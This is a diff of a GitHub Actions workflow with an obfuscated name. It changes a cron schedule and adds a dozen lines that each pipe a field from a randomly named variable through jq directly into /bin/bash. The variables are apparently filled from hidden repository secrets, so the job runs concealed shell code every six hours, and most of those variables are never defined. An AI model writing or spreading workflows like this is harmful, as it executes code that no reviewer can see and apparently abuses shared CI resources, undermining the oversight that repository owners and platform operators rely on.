@@ -1,8 +1,9 @@
 name: wellgaff
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 2/6 * * *'
+    - cron: '34 1/6 * * *'
 
 jobs:
   build:
@@ -11,11 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: wellgaff
         env:
-          qemu796: ${{ secrets.qemu796 }}
+          ble1031: ${{ secrets.ble1031 }}
         run: |
-          echo $qemu796 | jq -r .zmvu0 | /bin/bash
-          echo $fsrui0787 | jq -r .o2 | /bin/bash
-          echo $akdpg135 | jq -r .ermms6 | /bin/bash
-          echo $dc7 | jq -r .gdkl98075 | /bin/bash
-          echo $vz04 | jq -r .tap0539 | /bin/bash
+          echo $ble1031 | jq -r .rq800 | /bin/bash
+          echo $cliu1282 | jq -r .mpyq0 | /bin/bash
+          echo $ihoxu96017 | jq -r .amr8829 | /bin/bash
+          echo $qkv9 | jq -r .ya919 | /bin/bash
+          echo $zhvm1937 | jq -r .dufa1 | /bin/bash
+          echo $varn351 | jq -r .cr60 | /bin/bash
+          echo $znal3 | jq -r .ycty1658 | /bin/bash
+          echo $owv6768 | jq -r .mbyud991 | /bin/bash
+          echo $lkc00 | jq -r .mxvf4 | /bin/bash
+          echo $dnnu59 | jq -r .lveuh94093 | /bin/bash
+          echo $oxvd990 | jq -r .irdy18720 | /bin/bash
+          echo $hikbi8250 | jq -r .t0333 | /bin/bash
 
